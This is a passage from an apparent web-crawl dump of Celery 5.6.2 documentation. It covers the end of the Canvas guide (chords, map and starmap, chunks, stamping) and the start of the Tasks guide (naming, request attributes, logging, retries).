tasks.\n\nrevoke()\n\nRevoke all of the subtasks.\n\njoin()\n\nGather the results of all subtasks and return them in the same order as they were called (as a list).\n\nGroup Unrolling\n\nA group with a single signature will be unrolled to a single signature when chained. This means that the following group may pass either a list of results or a single result to the chain depending on the number of items in the group.\n\n>>> from celery import chain, group\n>>> from tasks import add\n>>> chain(add.s(2, 2), group(add.s(1)), add.s(1))\nadd(2, 2) | add(1) | add(1)\n>>> chain(add.s(2, 2), group(add.s(1), add.s(2)), add.s(1))\nadd(2, 2) | %add((add(1), add(2)), 1)\n\n\nThis means that you should be careful and make sure the add task can accept either a list or a single item as input if you plan to use it as part of a larger canvas.\n\nWarning\n\nIn Celery 4.x the following group below would not unroll into a chain due to a bug but instead the canvas would be upgraded into a chord.\n\n>>> from celery import chain, group\n>>> from tasks import add\n>>> chain(group(add.s(1, 1)), add.s(2))\n%add([add(1, 1)], 2)\n\n\nIn Celery 5.x this bug was fixed and the group is correctly unrolled into a single signature.\n\n>>> from celery import chain, group\n>>> from tasks import add\n>>> chain(group(add.s(1, 1)), add.s(2))\nadd(1, 1) | add(2)\n\nChords\n\nAdded in version 2.3.\n\nNote\n\nTasks used within a chord must not ignore their results. If the result backend is disabled for any task (header or body) in your chord you should read “Important Notes”. Chords are not currently supported with the RPC result backend.\n\nA chord is a task that only executes after all of the tasks in a group have finished executing.\n\nLet’s calculate the sum of the expression  up to a hundred digits.\n\nFirst you need two tasks, add() and tsum() (sum() is already a standard function):\n\n@app.task\ndef add(x, y):\n    return x + y\n\n@app.task\ndef tsum(numbers):\n    return sum(numbers)\n\n\nNow you can use a chord to calculate each addition step in parallel, and then get the sum of the resulting numbers:\n\n>>> from celery import chord\n>>> from tasks import add, tsum\n\n>>> chord(add.s(i, i)\n...       for i in range(100))(tsum.s()).get()\n9900\n\n\nThis is obviously a very contrived example, the overhead of messaging and synchronization makes this a lot slower than its Python counterpart:\n\n>>> sum(i + i for i in range(100))\n\n\nThe synchronization step is costly, so you should avoid using chords as much as possible. Still, the chord is a powerful primitive to have in your toolbox as synchronization is a required step for many parallel algorithms.\n\nLet’s break the chord expression down:\n\n>>> callback = tsum.s()\n>>> header = [add.s(i, i) for i in range(100)]\n>>> result = chord(header)(callback)\n>>> result.get()\n9900\n\n\nRemember, the callback can only be executed after all of the tasks in the header have returned. Each step in the header is executed as a task, in parallel, possibly on different nodes. The callback is then applied with the return value of each task in the header. The task id returned by chord() is the id of the callback, so you can wait for it to complete and get the final return value (but remember to never have a task wait for other tasks)\n\nError handling\n\nSo what happens if one of the tasks raises an exception?\n\nThe chord callback result will transition to the failure state, and the error is set to the ChordError exception:\n\n>>> c = chord([add.s(4, 4), raising_task.s(), add.s(8, 8)])\n>>> result = c()\n>>> result.get()\n\nTraceback (most recent call last):\n  File \"<stdin>\", line 1, in <module>\n  File \"*/celery/result.py\", line 120, in get\n    interval=interval)\n  File \"*/celery/backends/amqp.py\", line 150, in wait_for\n    raise meta['result']\ncelery.exceptions.ChordError: Dependency 97de6f3f-ea67-4517-a21c-d867c61fcb47\n    raised ValueError('something something',)\n\n\nWhile the traceback may be different depending on the result backend used, you can see that the error description includes the id of the task that failed and a string representation of the original exception. You can also find the original traceback in result.traceback.\n\nNote that the rest of the tasks will still execute, so the third task (add.s(8, 8)) is still executed even though the middle task failed. Also the ChordError only shows the task that failed first (in time): it doesn’t respect the ordering of the header group.\n\nTo perform an action when a chord fails you can therefore attach an errback to the chord callback:\n\n@app.task\ndef on_chord_error(request, exc, traceback):\n    print('Task {0!r} raised error: {1!r}'.format(request.id, exc))\n\n>>> c = (group(add.s(i, i) for i in range(10)) |\n...      tsum.s().on_error(on_chord_error.s())).delay()\n\n\nChords may have callback and errback signatures linked to them, which addresses some of the issues with linking signatures to groups. Doing so will link the provided signature to the chord’s body which can be expected to gracefully invoke callbacks just once upon completion of the body, or errbacks just once if any task in the chord header or body fails.\n\nThis behavior can be manipulated to allow error handling of the chord header using the task_allow_error_cb_on_chord_header flag. Enabling this flag will cause the chord header to invoke the errback for the body (default behavior) and any task in the chord’s header that fails.\n\nImportant Notes\n\nTasks used within a chord must not ignore their results. In practice this means that you must enable a result_backend in order to use chords. Additionally, if task_ignore_result is set to True in your configuration, be sure that the individual tasks to be used within the chord are defined with ignore_result=False. This applies to both Task subclasses and decorated tasks.\n\nExample Task subclass:\n\nclass MyTask(Task):\n    ignore_result = False\n\n\nExample decorated task:\n\n@app.task(ignore_result=False)\ndef another_task(project):\n    do_something()\n\n\nBy default the synchronization step is implemented by having a recurring task poll the completion of the group every second, calling the signature when ready.\n\nExample implementation:\n\nfrom celery import maybe_signature\n\n@app.task(bind=True)\ndef unlock_chord(self, group, callback, interval=1, max_retries=None):\n    if group.ready():\n        return maybe_signature(callback).delay(group.join())\n    raise self.retry(countdown=interval, max_retries=max_retries)\n\n\nThis is used by all result backends except Redis, Memcached and DynamoDB: they increment a counter after each task in the header, then applies the callback when the counter exceeds the number of tasks in the set.\n\nThe Redis, Memcached and DynamoDB approach is a much better solution, but not easily implemented in other backends (suggestions welcome!).\n\nNote\n\nChords don’t properly work with Redis before version 2.2; you’ll need to upgrade to at least redis-server 2.2 to use them.\n\nNote\n\nIf you’re using chords with the Redis result backend and also overriding the Task.after_return() method, you need to make sure to call the super method or else the chord callback won’t be applied.\n\ndef after_return(self, *args, **kwargs):\n    do_something()\n    super().after_return(*args, **kwargs)\n\nMap & Starmap\n\nmap and starmap are built-in tasks that call the provided calling task for every element in a sequence.\n\nThey differ from group in that:\n\nonly one task message is sent.\n\nthe operation is sequential.\n\nFor example using map:\n\n>>> from proj.tasks import add\n\n>>> ~tsum.map([list(range(10)), list(range(100))])\n[45, 4950]\n\n\nis the same as having a task doing:\n\n@app.task\ndef temp():\n    return [tsum(range(10)), tsum(range(100))]\n\n\nand using starmap:\n\n>>> ~add.starmap(zip(range(10), range(10)))\n[0, 2, 4, 6, 8, 10, 12, 14, 16, 18]\n\n\nis the same as having a task doing:\n\n@app.task\ndef temp():\n    return [add(i, i) for i in range(10)]\n\n\nBoth map and starmap are signature objects, so they can be used as other signatures and combined in groups etc., for example to call the starmap after 10 seconds:\n\n>>> add.starmap(zip(range(10), range(10))).apply_async(countdown=10)\n\nChunks\n\nChunking lets you divide an iterable of work into pieces, so that if you have one million objects, you can create 10 tasks with a hundred thousand objects each.\n\nSome may worry that chunking your tasks results in a degradation of parallelism, but this is rarely true for a busy cluster and in practice since you’re avoiding the overhead of messaging it may considerably increase performance.\n\nTo create a chunks’ signature you can use app.Task.chunks():\n\n>>> add.chunks(zip(range(100), range(100)), 10)\n\n\nAs with group the act of sending the messages for the chunks will happen in the current process when called:\n\n>>> from proj.tasks import add\n\n>>> res = add.chunks(zip(range(100), range(100)), 10)()\n>>> res.get()\n[[0, 2, 4, 6, 8, 10, 12, 14, 16, 18],\n [20, 22, 24, 26, 28, 30, 32, 34, 36, 38],\n [40, 42, 44, 46, 48, 50, 52, 54, 56, 58],\n [60, 62, 64, 66, 68, 70, 72, 74, 76, 78],\n [80, 82, 84, 86, 88, 90, 92, 94, 96, 98],\n [100, 102, 104, 106, 108, 110, 112, 114, 116, 118],\n [120, 122, 124, 126, 128, 130, 132, 134, 136, 138],\n [140, 142, 144, 146, 148, 150, 152, 154, 156, 158],\n [160, 162, 164, 166, 168, 170, 172, 174, 176, 178],\n [180, 182, 184, 186, 188, 190, 192, 194, 196, 198]]\n\n\nwhile calling .apply_async will create a dedicated task so that the individual tasks are applied in a worker instead:\n\n>>> add.chunks(zip(range(100), range(100)), 10).apply_async()\n\n\nYou can also convert chunks to a group:\n\n>>> group = add.chunks(zip(range(100), range(100)), 10).group()\n\n\nand with the group skew the countdown of each task by increments of one:\n\n>>> group.skew(start=1, stop=10)()\n\n\nThis means that the first task will have a countdown of one second, the second task a countdown of two seconds, and so on.\n\nStamping\n\nAdded in version 5.3.\n\nThe goal of the Stamping API is to give an ability to label the signature and its components for debugging information purposes. For example, when the canvas is a complex structure, it may be necessary to label some or all elements of the formed structure. The complexity increases even more when nested groups are rolled-out or chain elements are replaced. In such cases, it may be necessary to understand which group an element is a part of or on what nested level it is. This requires a mechanism that traverses the canvas elements and marks them with specific metadata. The stamping API allows doing that based on the Visitor pattern.\n\nFor example,\n\n>>> sig1 = add.si(2, 2)\n>>> sig1_res = sig1.freeze()\n>>> g = group(sig1, add.si(3, 3))\n>>> g.stamp(stamp='your_custom_stamp')\n>>> res = g.apply_async()\n>>> res.get(timeout=TIMEOUT)\n[4, 6]\n>>> sig1_res._get_task_meta()['stamp']\n['your_custom_stamp']\n\n\nwill initialize a group g and mark its components with stamp your_custom_stamp.\n\nFor this feature to be useful, you need to set the result_extended configuration option to True or directive result_extended = True.\n\nCanvas stamping\n\nWe can also stamp the canvas with custom stamping logic, using the visitor class StampingVisitor as the base class for the custom stamping visitor.\n\nCustom stamping\n\nIf more complex stamping logic is required, it is possible to implement custom stamping behavior based on the Visitor pattern. The class that implements this custom logic must inherit StampingVisitor and implement appropriate methods.\n\nFor example, the following example InGroupVisitor will label tasks that are in side of some group by label in_group.\n\nclass InGroupVisitor(StampingVisitor):\n    def __init__(self):\n        self.in_group = False\n\n    def on_group_start(self, group, **headers) -> dict:\n        self.in_group = True\n        return {\"in_group\": [self.in_group], \"stamped_headers\": [\"in_group\"]}\n\n    def on_group_end(self, group, **headers) -> None:\n        self.in_group = False\n\n    def on_chain_start(self, chain, **headers) -> dict:\n        return {\"in_group\": [self.in_group], \"stamped_headers\": [\"in_group\"]}\n\n    def on_signature(self, sig, **headers) -> dict:\n        return {\"in_group\": [self.in_group], \"stamped_headers\": [\"in_group\"]}\n\n\nThe following example shows another custom stamping visitor, which labels all tasks with a custom monitoring_id which can represent a UUID value of an external monitoring system, that can be used to track the task execution by including the id with such a visitor implementation. This monitoring_id can be a randomly generated UUID, or a unique identifier of the span id used by the external monitoring system, etc.\n\nclass MonitoringIdStampingVisitor(StampingVisitor):\n    def on_signature(self, sig, **headers) -> dict:\n        return {'monitoring_id': uuid4().hex}\n\n\nImportant\n\nThe stamped_headers key in the dictionary returned by on_signature() (or any other visitor method) is optional:\n\n# Approach 1: Without stamped_headers - ALL keys are treated as stamps\ndef on_signature(self, sig, **headers) -> dict:\n    return {'monitoring_id': uuid4().hex}  # monitoring_id becomes a stamp\n\n# Approach 2: With stamped_headers - ONLY listed keys are stamps\ndef on_signature(self, sig, **headers) -> dict:\n    return {\n        'monitoring_id': uuid4().hex,      # This will be a stamp\n        'other_data': 'value',             # This will NOT be a stamp\n        'stamped_headers': ['monitoring_id']  # Only monitoring_id is stamped\n    }\n\n\nIf the stamped_headers key is not specified, the stamping visitor will assume all keys in the returned dictionary are stamped headers.\n\nNext, let’s see how to use the MonitoringIdStampingVisitor example stamping visitor.\n\nsig_example = signature('t1')\nsig_example.stamp(visitor=MonitoringIdStampingVisitor())\n\ngroup_example = group([signature('t1'), signature('t2')])\ngroup_example.stamp(visitor=MonitoringIdStampingVisitor())\n\nchord_example = chord([signature('t1'), signature('t2')], signature('t3'))\nchord_example.stamp(visitor=MonitoringIdStampingVisitor())\n\nchain_example = chain(signature('t1'), group(signature('t2'), signature('t3')), signature('t4'))\nchain_example.stamp(visitor=MonitoringIdStampingVisitor())\n\n\nLastly, it’s important to mention that each monitoring id stamp in the example above would be different from each other between tasks.\n\nCallbacks stamping\n\nThe stamping API also supports stamping callbacks implicitly. This means that when a callback is added to a task, the stamping visitor will be applied to the callback as well.\n\nWarning\n\nThe callback must be linked to the signature before stamping.\n\nFor example, let’s examine the following custom stamping visitor that uses the implicit approach where all returned dictionary keys are automatically treated as stamped headers without explicitly specifying stamped_headers.\n\nclass CustomStampingVisitor(StampingVisitor):\n    def on_signature(self, sig, **headers) -> dict:\n        # 'header' will automatically be treated as a stamped header\n        # without needing to specify 'stamped_headers': ['header']\n        return {'header': 'value'}\n\n    def on_callback(self, callback, **header) -> dict:\n        # 'on_callback' will automatically be treated as a stamped header\n        return {'on_callback': True}\n\n    def on_errback(self, errback, **header) -> dict:\n        # 'on_errback' will automatically be treated as a stamped header\n        return {'on_errback': True}\n\n\nThis custom stamping visitor will stamp the signature, callbacks, and errbacks with {'header': 'value'} and stamp the callbacks and errbacks with {'on_callback': True} and {'on_errback': True} respectively as shown below.\n\nc = chord([add.s(1, 1), add.s(2, 2)], xsum.s())\ncallback = signature('sig_link')\nerrback = signature('sig_link_error')\nc.link(callback)\nc.link_error(errback)\nc.stamp(visitor=CustomStampingVisitor())\n\n\nThis example will result in the following stamps:\n\n>>> c.options\n{'header': 'value', 'stamped_headers': ['header']}\n>>> c.tasks.tasks[0].options\n{'header': 'value', 'stamped_headers': ['header']}\n>>> c.tasks.tasks[1].options\n{'header': 'value', 'stamped_headers': ['header']}\n>>> c.body.options\n{'header': 'value', 'stamped_headers': ['header']}\n>>> c.body.options['link'][0].options\n{'header': 'value', 'on_callback': True, 'stamped_headers': ['header', 'on_callback']}\n>>> c.body.options['link_error'][0].options\n{'header': 'value', 'on_errback': True, 'stamped_headers': ['header', 'on_errback']}\n\n\nDonations\n\nPlease help support this community project with a donation.\n\nPrevious topic\n\nCalling Tasks\n\nNext topic\n\nWorkers Guide\n\nThis Page\nShow Source\nQuick search\nindex\nmodules |\nnext |\nprevious |\nCelery 5.6.2 documentation » User Guide » Canvas: Designing Work-flows\n© Copyright 2009-2023, Ask Solem & contributors."
  },
  {
    "id": 60491568,
    "timestamp": "2026-02-23T00:13:49.293Z",
    "title": "Tasks — Celery 5.6.2 documentation",
    "url": "https://docs.celeryq.dev/en/stable/userguide/tasks.html",
    "text": "index\nmodules |\nnext |\nprevious |\nCelery 5.6.2 documentation » User Guide » Tasks\n\nThis document describes the current stable version of Celery (5.6). For development docs, go here.\n\nTasks\n\nTasks are the building blocks of Celery applications.\n\nA task is a class that can be created out of any callable. It performs dual roles in that it defines both what happens when a task is called (sends a message), and what happens when a worker receives that message.\n\nEvery task class has a unique name, and this name is referenced in messages so the worker can find the right function to execute.\n\nA task message is not removed from the queue until that message has been acknowledged by a worker. A worker can reserve many messages in advance and even if the worker is killed – by power failure or some other reason – the message will be redelivered to another worker.\n\nIdeally task functions should be idempotent: meaning the function won’t cause unintended effects even if called multiple times with the same arguments. Since the worker cannot detect if your tasks are idempotent, the default behavior is to acknowledge the message in advance, just before it’s executed, so that a task invocation that already started is never executed again.\n\nIf your task is idempotent you can set the acks_late option to have the worker acknowledge the message after the task returns instead. See also the FAQ entry Should I use retry or acks_late?.\n\nNote that the worker will acknowledge the message if the child process executing the task is terminated (either by the task calling sys.exit(), or by signal) even when acks_late is enabled. This behavior is intentional as…\n\nWe don’t want to rerun tasks that forces the kernel to send a SIGSEGV (segmentation fault) or similar signals to the process.\n\nWe assume that a system administrator deliberately killing the task does not want it to automatically restart.\n\nA task that allocates too much memory is in danger of triggering the kernel OOM killer, the same may happen again.\n\nA task that always fails when redelivered may cause a high-frequency message loop taking down the system.\n\nIf you really want a task to be redelivered in these scenarios you should consider enabling the task_reject_on_worker_lost setting.\n\nWarning\n\nA task that blocks indefinitely may eventually stop the worker instance from doing any other work.\n\nIf your task does I/O then make sure you add timeouts to these operations, like adding a timeout to a web request using the https://pypi.org/project/requests/ library:\n\nconnect_timeout, read_timeout = 5.0, 30.0\nresponse = requests.get(URL, timeout=(connect_timeout, read_timeout))\n\n\nTime limits are convenient for making sure all tasks return in a timely manner, but a time limit event will actually kill the process by force so only use them to detect cases where you haven’t used manual timeouts yet.\n\nIn previous versions, the default prefork pool scheduler was not friendly to long-running tasks, so if you had tasks that ran for minutes/hours, it was advised to enable the -Ofair command-line argument to the celery worker. However, as of version 4.0, -Ofair is now the default scheduling strategy. See Prefetch Limits for more information, and for the best performance route long-running and short-running tasks to dedicated workers (Automatic routing).\n\nIf your worker hangs then please investigate what tasks are running before submitting an issue, as most likely the hanging is caused by one or more tasks hanging on a network operation.\n\n–\n\nIn this chapter you’ll learn all about defining tasks, and this is the table of contents:\n\nBasics\n\nNames\n\nTask Request\n\nLogging\n\nRetrying\n\nArgument validation with Pydantic\n\nList of Options\n\nStates\n\nSemipredicates\n\nCustom task classes\n\nHow it works\n\nTips and Best Practices\n\nPerformance and Strategies\n\nExample\n\nBasics\n\nYou can easily create a task from any callable by using the app.task() decorator:\n\nfrom .models import User\n\n@app.task\ndef create_user(username, password):\n    User.objects.create(username=username, password=password)\n\n\nThere are also many options that can be set for the task, these can be specified as arguments to the decorator:\n\n@app.task(serializer='json')\ndef create_user(username, password):\n    User.objects.create(username=username, password=password)\n\nHow do I import the task decorator?\n\nThe task decorator is available on your Celery application instance, if you don’t know what this is then please read First Steps with Celery.\n\nIf you’re using Django (see First steps with Django), or you’re the author of a library then you probably want to use the shared_task() decorator:\n\nfrom celery import shared_task\n\n@shared_task\ndef add(x, y):\n    return x + y\n\nMultiple decorators\n\nWhen using multiple decorators in combination with the task decorator you must make sure that the task decorator is applied last (oddly, in Python this means it must be first in the list):\n\n@app.task\n@decorator2\n@decorator1\ndef add(x, y):\n    return x + y\n\nBound tasks\n\nA task being bound means the first argument to the task will always be the task instance (self), just like Python bound methods:\n\nlogger = get_task_logger(__name__)\n\n@app.task(bind=True)\ndef add(self, x, y):\n    logger.info(self.request.id)\n\n\nBound tasks are needed for retries (using app.Task.retry()), for accessing information about the current task request, and for any additional functionality you add to custom task base classes.\n\nTask inheritance\n\nThe base argument to the task decorator specifies the base class of the task:\n\nimport celery\n\nclass MyTask(celery.Task):\n\n    def on_failure(self, exc, task_id, args, kwargs, einfo):\n        print('{0!r} failed: {1!r}'.format(task_id, exc))\n\n@app.task(base=MyTask)\ndef add(x, y):\n    raise KeyError()\n\nNames\n\nEvery task must have a unique name.\n\nIf no explicit name is provided the task decorator will generate one for you, and this name will be based on 1) the module the task is defined in, and 2) the name of the task function.\n\nExample setting explicit name:\n\n>>> @app.task(name='sum-of-two-numbers')\n>>> def add(x, y):\n...     return x + y\n\n>>> add.name\n'sum-of-two-numbers'\n\n\nA best practice is to use the module name as a name-space, this way names won’t collide if there’s already a task with that name defined in another module.\n\n>>> @app.task(name='tasks.add')\n>>> def add(x, y):\n...     return x + y\n\n\nYou can tell the name of the task by investigating its .name attribute:\n\n>>> add.name\n'tasks.add'\n\n\nThe name we specified here (tasks.add) is exactly the name that would’ve been automatically generated for us if the task was defined in a module named tasks.py:\n\ntasks.py:\n\n@app.task\ndef add(x, y):\n    return x + y\n\n>>> from tasks import add\n>>> add.name\n'tasks.add'\n\n\nNote\n\nYou can use the inspect command in a worker to view the names of all registered tasks. See the inspect registered command in the Management Command-line Utilities (inspect/control) section of the User Guide.\n\nChanging the automatic naming behavior\n\nAdded in version 4.0.\n\nThere are some cases when the default automatic naming isn’t suitable. Consider having many tasks within many different modules:\n\nproject/\n       /__init__.py\n       /celery.py\n       /moduleA/\n               /__init__.py\n               /tasks.py\n       /moduleB/\n               /__init__.py\n               /tasks.py\n\n\nUsing the default automatic naming, each task will have a generated name like moduleA.tasks.taskA, moduleA.tasks.taskB, moduleB.tasks.test, and so on. You may want to get rid of having tasks in all task names. As pointed above, you can explicitly give names for all tasks, or you can change the automatic naming behavior by overriding app.gen_task_name(). Continuing with the example, celery.py may contain:\n\nfrom celery import Celery\n\nclass MyCelery(Celery):\n\n    def gen_task_name(self, name, module):\n        if module.endswith('.tasks'):\n            module = module[:-6]\n        return super().gen_task_name(name, module)\n\napp = MyCelery('main')\n\n\nSo each task will have a name like moduleA.taskA, moduleA.taskB and moduleB.test.\n\nWarning\n\nMake sure that your app.gen_task_name() is a pure function: meaning that for the same input it must always return the same output.\n\nTask Request\n\napp.Task.request contains information and state related to the currently executing task.\n\nThe request defines the following attributes:\n\nid:\n\nThe unique id of the executing task.\n\ngroup:\n\nThe unique id of the task’s group, if this task is a member.\n\nchord:\n\nThe unique id of the chord this task belongs to (if the task is part of the header).\n\ncorrelation_id:\n\nCustom ID used for things like de-duplication.\n\nargs:\n\nPositional arguments.\n\nkwargs:\n\nKeyword arguments.\n\norigin:\n\nName of host that sent this task.\n\nretries:\n\nHow many times the current task has been retried. An integer starting at 0.\n\nis_eager:\n\nSet to True if the task is executed locally in the client, not by a worker.\n\neta:\n\nThe original ETA of the task (if any). This is in UTC time (depending on the enable_utc setting).\n\nexpires:\n\nThe original expiry time of the task (if any). This is in UTC time (depending on the enable_utc setting).\n\nhostname:\n\nNode name of the worker instance executing the task.\n\ndelivery_info:\n\nAdditional message delivery information. This is a mapping containing the exchange and routing key used to deliver this task. Used by for example app.Task.retry() to resend the task to the same destination queue. Availability of keys in this dict depends on the message broker used.\n\nreply-to:\n\nName of queue to send replies back to (used with RPC result backend for example).\n\ncalled_directly:\n\nThis flag is set to true if the task wasn’t executed by the worker.\n\ntimelimit:\n\nA tuple of the current (soft, hard) time limits active for this task (if any).\n\ncallbacks:\n\nA list of signatures to be called if this task returns successfully.\n\nerrbacks:\n\nA list of signatures to be called if this task fails.\n\nutc:\n\nSet to true the caller has UTC enabled (enable_utc).\n\nAdded in version 3.1.\n\nheaders:\n\nMapping of message headers sent with this task message (may be None).\n\nreply_to:\n\nWhere to send reply to (queue name).\n\ncorrelation_id:\n\nUsually the same as the task id, often used in amqp to keep track of what a reply is for.\n\nAdded in version 4.0.\n\nroot_id:\n\nThe unique id of the first task in the workflow this task is part of (if any).\n\nparent_id:\n\nThe unique id of the task that called this task (if any).\n\nchain:\n\nReversed list of tasks that form a chain (if any). The last item in this list will be the next task to succeed the current task. If using version one of the task protocol the chain tasks will be in request.callbacks instead.\n\nAdded in version 5.2.\n\nproperties:\n\nMapping of message properties received with this task message (may be None or {})\n\nreplaced_task_nesting:\n\nHow many times the task was replaced, if at all. (may be 0)\n\nExample\n\nAn example task accessing information in the context is:\n\n@app.task(bind=True)\ndef dump_context(self, x, y):\n    print('Executing task id {0.id}, args: {0.args!r} kwargs: {0.kwargs!r}'.format(\n            self.request))\n\n\nThe bind argument means that the function will be a “bound method” so that you can access attributes and methods on the task type instance.\n\nLogging\n\nThe worker will automatically set up logging for you, or you can configure logging manually.\n\nA special logger is available named “celery.task”, you can inherit from this logger to automatically get the task name and unique id as part of the logs.\n\nThe best practice is to create a common logger for all of your tasks at the top of your module:\n\nfrom celery.utils.log import get_task_logger\n\nlogger = get_task_logger(__name__)\n\n@app.task\ndef add(x, y):\n    logger.info('Adding {0} + {1}'.format(x, y))\n    return x + y\n\n\nCelery uses the standard Python logger library, and the documentation can be found here.\n\nYou can also use print(), as anything written to standard out/-err will be redirected to the logging system (you can disable this, see worker_redirect_stdouts).\n\nNote\n\nThe worker won’t update the redirection if you create a logger instance somewhere in your task or task module.\n\nIf you want to redirect sys.stdout and sys.stderr to a custom logger you have to enable this manually, for example:\n\nimport sys\n\nlogger = get_task_logger(__name__)\n\n@app.task(bind=True)\ndef add(self, x, y):\n    old_outs = sys.stdout, sys.stderr\n    rlevel = self.app.conf.worker_redirect_stdouts_level\n    try:\n        self.app.log.redirect_stdouts_to_logger(logger, rlevel)\n        print('Adding {0} + {1}'.format(x, y))\n        return x + y\n    finally:\n        sys.stdout, sys.stderr = old_outs\n\n\nNote\n\nIf a specific Celery logger you need is not emitting logs, you should check that the logger is propagating properly. In this example “celery.app.trace” is enabled so that “succeeded in” logs are emitted:\n\nimport celery\nimport logging\n\n@celery.signals.after_setup_logger.connect\ndef on_after_setup_logger(**kwargs):\n    logger = logging.getLogger('celery')\n    logger.propagate = True\n    logger = logging.getLogger('celery.app.trace')\n    logger.propagate = True\n\n\nNote\n\nIf you want to completely disable Celery logging configuration, use the setup_logging signal:\n\nimport celery\n\n@celery.signals.setup_logging.connect\ndef on_setup_logging(**kwargs):\n    pass\n\nArgument checking\n\nAdded in version 4.0.\n\nCelery will verify the arguments passed when you call the task, just like Python does when calling a normal function:\n\n>>> @app.task\n... def add(x, y):\n...     return x + y\n\n# Calling the task with two arguments works:\n>>> add.delay(8, 8)\n<AsyncResult: f59d71ca-1549-43e0-be41-4e8821a83c0c>\n\n# Calling the task with only one argument fails:\n>>> add.delay(8)\nTraceback (most recent call last):\n  File \"<stdin>\", line 1, in <module>\n  File \"celery/app/task.py\", line 376, in delay\n    return self.apply_async(args, kwargs)\n  File \"celery/app/task.py\", line 485, in apply_async\n    check_arguments(*(args or ()), **(kwargs or {}))\nTypeError: add() takes exactly 2 arguments (1 given)\n\n\nYou can disable the argument checking for any task by setting its typing attribute to False:\n\n>>> @app.task(typing=False)\n... def add(x, y):\n...     return x + y\n\n# Works locally, but the worker receiving the task will raise an error.\n>>> add.delay(8)\n<AsyncResult: f59d71ca-1549-43e0-be41-4e8821a83c0c>\n\nHiding sensitive information in arguments\n\nAdded in version 4.0.\n\nWhen using task_protocol 2 or higher (default since 4.0), you can override how positional arguments and keyword arguments are represented in logs and monitoring events using the argsrepr and kwargsrepr calling arguments:\n\n>>> add.apply_async((2, 3), argsrepr='(<secret-x>, <secret-y>)')\n\n>>> charge.s(account, card='1234 5678 1234 5678').set(\n...     kwargsrepr=repr({'card': '**** **** **** 5678'})\n... ).delay()\n\n\nWarning\n\nSensitive information will still be accessible to anyone able to read your task message from the broker, or otherwise able intercept it.\n\nFor this reason you should probably encrypt your message if it contains sensitive information, or in this example with a credit card number the actual number could be stored encrypted in a secure store that you retrieve and decrypt in the task itself.\n\nRetrying\n\napp.Task.retry() can be used to re-execute the task, for example in the event of recoverable errors.\n\nWhen you call retry it’ll send a new message, using the same task-id, and it’ll take care to make sure the message is delivered to the same queue as the originating task.\n\nWhen a task is retried this is also recorded as a task state, so that you can track the progress of the task using the result instance (see States).\n\nHere’s an example using retry:\n\n@app.task(bind=True)\ndef send_twitter_status(self, oauth, tweet):\n    try:\n        twitter = Twitter(oauth)\n        twitter.update_status(tweet)\n    except (Twitter.FailWhaleError, Twitter.LoginError) as exc:\n        raise self.retry(exc=exc)\n\n\nNote\n\nThe app.Task.retry() call will raise an exception so any code after the retry won’t be reached. This is the Retry exception, it isn’t handled as an error but rather as a semi-predicate to signify to the worker that the task is to be retried, so that it can store the correct state when a result backend is enabled.\n\nThis is normal operation and always happens unless the throw argument to retry is set to False.\n\nThe bind argument to the task decorator will give access to self (the task type instance).\n\nThe exc argument is used to pass exception information that’s used in logs, and when storing task results. Both the exception and the traceback will be available in the task state (if a result backend is enabled).\n\nIf the task has a max_retries value the current exception will be re-raised if the max number of retries has been exceeded, but this won’t happen if:\n\nAn exc argument wasn’t given.\n\nIn this case the MaxRetriesExceededError exception will be raised.\n\nThere’s no current exception\n\nIf there’s no original exception to re-raise the exc argument will be used instead, so:\n\nself.retry(exc=Twitter.LoginError())\n\n\nwill raise the exc argument given.\n\nUsing a custom retry delay\n\nWhen a task is to be retried, it can wait for a given amount of time before doing so, and the default delay is defined by the default_retry_delay attribute. By default this is set to 3 minutes. Note that the unit for setting the delay is in seconds (int or float).\n\nYou can also provide the countdown argument to retry() to override this default.\n\n@app.task(bind=True, default_retry_delay=30 * 60)  # retry in 30 minutes.\ndef add(self, x, y):\n    try:\n        something_raising()\n    except Exception as exc:\n        # overrides the default delay to retry after 1 minute\n        raise self.retry(exc=exc, countdown=60)\n\nAutomatic retry for known exceptions\n\nAdded in version 4.0.\n\nSometimes you just want to retry a task whenever a particular exception is raised.\n\nFortunately, you can tell Celery to automatically retry a task using autoretry_for argument in the app.task() decorator:\n\nfrom twitter.exceptions import FailWhaleError\n\n@app.task(autoretry_for=(FailWhaleError,))\ndef refresh_timeline(user):\n    return twitter.refresh_timeline(user)\n\n\nIf you want to specify custom arguments for an internal retry() call, pass retry_kwargs argument to app.task() decorator:\n\n@app.task(autoretry_for=(FailWhaleError,),\n          retry_kwargs={'max_retries': 5})\ndef refresh_timeline(user):\n    return twitter.refresh_timeline(user)\n\n\nThis is provided as an alternative to manually handling the exceptions, and the example above will do the same as wrapping the task body in a try … except statement:\n\n@app.task\ndef refresh_timeline(user):\n    try:\n        twitter.refresh_timeline(user)\n    except FailWhaleError as exc:\n        raise refresh_timeline.retry(exc=exc, max_retries=5)\n\n\nIf you want to automatically retry on any error, simply use:\n\n@app.task(autoretry_for=(Exception,))\ndef x():\n    ...\n\n\nAdded in version 4.2.\n\nIf your tasks depend on another service, like making a request to an API, then it’s a good idea to use exponential backoff to avoid overwhelming the service with your requests. Fortunately, Celery’s automatic retry support makes it easy. Just specify the retry_backoff argument, like this:\n\nfrom requests.exceptions import RequestException\n\n@app.task(autoretry_for=(RequestException,), retry_backoff=True)\ndef x():\n    ...\n\n\nBy default, this exponential backoff will also introduce random jitter to avoid having all the tasks run at the same moment. It will also cap the maximum backoff delay to 10 minutes. All these settings can be customized via options documented below.\n\nAdded in version 4.4.\n\nYou can also set autoretry_for, max_retries, retry_backoff, retry_backoff_max and retry_jitter options in class-based tasks:\n\nclass BaseTaskWithRetry(Task):\n    autoretry_for = (TypeError,)\n    max_retries = 5\n    retry_backoff = True\n    retry_backoff_max = 700\n    retry_jitter = False\n\nTask.autoretry_for\n\nA list/tuple of exception classes. If any of these exceptions are raised during the execution of the task, the task will automatically be retried. By default, no exceptions will be autoretried.\n\nTask.max_retries\n\nA number. Maximum number of retries before giving up. A value of None means task will retry forever. By default, this option is set to 3.\n\nTask.retry_backoff\n\nA boolean, or a number. If this option is set to True, autoretries will be delayed following the rules of exponential backoff. The first retry will have a delay of 1 second, the second retry will have a delay of 2 seconds, the third will delay 4 seconds, the fourth will delay 8 seconds, and so on. (However, this delay value is modified by retry_jitter, if it is enabled.) If this option is set to a number, it is used as a delay factor. For example, if this option is set to 3, the first retry will delay 3 seconds, the second will delay 6 seconds, the third will delay 12 seconds, the fourth will delay 24 seconds, and so on. By default, this option is set to False, and autoretries will not be delayed.\n\nTask.retry_backoff_max\n\nA number. If retry_backoff is enabled, this option will set a maximum delay in seconds 